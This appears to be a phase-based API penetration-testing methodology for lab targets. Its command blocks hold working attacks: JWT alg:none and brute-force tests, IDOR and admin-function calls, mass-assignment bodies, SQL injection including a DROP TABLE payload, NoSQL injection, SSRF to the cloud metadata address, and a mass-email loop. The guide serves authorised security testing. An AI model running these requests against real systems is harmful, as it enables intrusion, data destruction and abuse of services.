# API Security Testing Methodology

> A repeatable, phase-based approach to API penetration testing.  
> Mirrors the structure of a professional engagement — from recon to report.

---

## Phase 0 — Scope & Setup

Before touching a single endpoint, define boundaries and configure your environment.

```
[ ] Confirm in-scope hosts, ports, and API versions
[ ] Set up Burp Suite with target scope defined
[ ] Import any provided API specifications (OpenAPI/Swagger, Postman collection)
[ ] Spin up lab: docker compose up -d
[ ] Verify connectivity to all targets
[ ] Set environment variables: CRAPI_URL, VAMPI_URL, TOKEN
```

---

## Phase 1 — Reconnaissance & Discovery

Goal: Build a complete map of the attack surface before exploiting anything.

### 1.1 Passive Recon

```bash
# Check for exposed API docs
curl -s $TARGET/swagger.json | jq .
curl -s $TARGET/openapi.json | jq .
curl -s $TARGET/api-docs | jq .
curl -s $TARGET/v1/docs
curl -s $TARGET/.well-known/openapi

# Check for GraphQL introspection
curl -s -X POST $TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
```

### 1.2 Active Endpoint Fuzzing

```bash
# Fuzz for undocumented endpoints
ffuf -w /opt/wordlists/api-endpoints.txt \
     -u $TARGET/FUZZ \
     -mc 200,201,401,403 \
     -o /opt/reports/endpoints.json \
     -of json

# Fuzz for versioning (v1 → v2, v3...)
ffuf -w /opt/wordlists/versions.txt \
     -u $TARGET/api/FUZZ/users \
     -mc 200,201,401,403
```

### 1.3 API Specification Analysis

If a Swagger/OpenAPI spec is available:

```bash
# Use kiterunner for spec-aware fuzzing
kr scan $TARGET -w routes-large.kite --output-file kr-results.txt

# Extract all endpoint paths from spec
cat openapi.json | jq '[.paths | keys[]]'
```

### 1.4 Capture Baseline Traffic

- Configure browser to proxy through Burp Suite
- Walk through all application functionality as a legitimate user
- Register, login, update profile, use core features
- Export Burp target sitemap on completion

---

## Phase 2 — Authentication Testing

Goal: Identify weaknesses in how identity is established and maintained.

### 2.1 JWT Analysis

```bash
# Decode without verification
jwt_tool $TOKEN

# Test alg:none bypass
jwt_tool $TOKEN -X a

# Brute-force signing secret
jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Test key confusion (RS256 → HS256 with public key)
jwt_tool $TOKEN -X k -pk public.pem
```

### 2.2 Token Properties Checklist

```
[ ] Does the token expire? (exp claim present and enforced?)
[ ] Is the algorithm pinned server-side? (alg:none accepted?)
[ ] Is the secret brute-forceable?
[ ] Is the token invalidated on logout?
[ ] Are refresh tokens rotated on use?
[ ] Are old tokens rejected after password change?
```

### 2.3 Rate Limiting on Auth Endpoints

```bash
# Test for account lockout / rate limiting
for i in $(seq 1 100); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST $TARGET/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"wrong'$i'"}')
  echo "Attempt $i: $STATUS"
done
```

---

## Phase 3 — Authorization Testing

Goal: Verify that every user can only access their own resources.

### 3.1 BOLA / IDOR Testing

```bash
# Step 1: Identify all endpoints that accept object IDs
grep -E "(GET|POST|PUT|DELETE).*{[a-zA-Z_]+Id}" openapi.json

# Step 2: For each endpoint, test cross-user access
# Authenticate as User A, collect object IDs
# Authenticate as User B, attempt to access User A's objects using User B's token

curl -s $TARGET/api/v1/user/USER_A_ID/data \
  -H "Authorization: Bearer $TOKEN_B"
```

### 3.2 BFLA — Function Level Authorization

```bash
# Test if low-privilege user can call admin functions
curl -s $TARGET/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

curl -s -X DELETE $TARGET/admin/users/123 \
  -H "Authorization: Bearer $USER_TOKEN"

# Test HTTP method switching
curl -s -X POST $TARGET/api/v1/user/profile \   # Normally GET only
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"admin":true}'
```

### 3.3 Mass Assignment / BOPLA

```bash
# Add unexpected fields to update requests
curl -s -X PUT $TARGET/api/v1/user/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker",
    "email": "attacker@evil.com",
    "role": "admin",          ← injected
    "credit_balance": 99999,  ← injected
    "isAdmin": true           ← injected
  }'
```

---

## Phase 4 — Input Validation & Injection Testing

### 4.1 SQLi in API Parameters

```bash
# Test query parameters
curl -s "$TARGET/api/v1/users?id=1' OR '1'='1"
curl -s "$TARGET/api/v1/users?id=1; DROP TABLE users--"

# Test JSON body
curl -s -X POST $TARGET/api/v1/search \
  -H "Content-Type: application/json" \
  -d '{"query": "\" OR 1=1--"}'
```

### 4.2 NoSQL Injection

```bash
# MongoDB operator injection
curl -s -X POST $TARGET/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
```

### 4.3 SSRF Testing

```bash
# Test URL parameters that fetch remote resources
curl -s "$TARGET/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/"

# Bypass filters with alternative encodings
curl -s "$TARGET/api/v1/fetch?url=http://[::ffff:169.254.169.254]/latest/meta-data/"
```

---

## Phase 5 — Business Logic & Rate Limiting

### 5.1 Unrestricted Resource Consumption

```bash
# Test for missing pagination limits
curl -s "$TARGET/api/v1/users?limit=999999999"

# Test for missing rate limiting on expensive operations
for i in $(seq 1 1000); do
  curl -s -X POST $TARGET/api/v1/send-email \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"to":"spam@victim.com","subject":"test"}'
done
```

### 5.2 Business Flow Abuse

```
[ ] Can a coupon be applied multiple times?
[ ] Can a negative quantity be placed in an order?
[ ] Can the payment step be skipped?
[ ] Can a discount be applied without meeting the conditions?
```

---

## Phase 6 — Documentation & Reporting

Every finding gets documented using the standard template at `reports/templates/finding-template.md`.

### Severity Rating

| Severity | CVSS Range | Action |
|----------|-----------|--------|
| Critical | 9.0–10.0 | Immediate escalation |
| High | 7.0–8.9 | Fix within 7 days |
| Medium | 4.0–6.9 | Fix within 30 days |
| Low | 0.1–3.9 | Fix in next sprint |
| Info | N/A | Informational |

### Report Structure

```
1. Executive Summary        — 1 paragraph, business impact focus
2. Scope & Methodology      — what was tested, how, when
3. Findings Summary Table   — ID, title, severity, status
4. Detailed Findings        — one section per finding (use template)
5. Remediation Roadmap      — prioritized fix list
6. Appendices               — raw requests, tool output
```

---

## Quick Reference — Common API Attack Patterns

```
BOLA:        Swap your object ID for another user's in the URL
BFLA:        Call admin endpoints with a user token
Auth bypass: alg:none JWT, brute-force secret, expired token reuse
Mass assign: Add admin:true to update request bodies
SSRF:        url= / redirect= parameters pointing to internal services
SQLi:        ' OR 1=1-- in query params and JSON bodies
NoSQLi:      {"$gt":""} in JSON login bodies
Rate limit:  Loop 1000 requests, watch for 429 vs 200 throughout
```
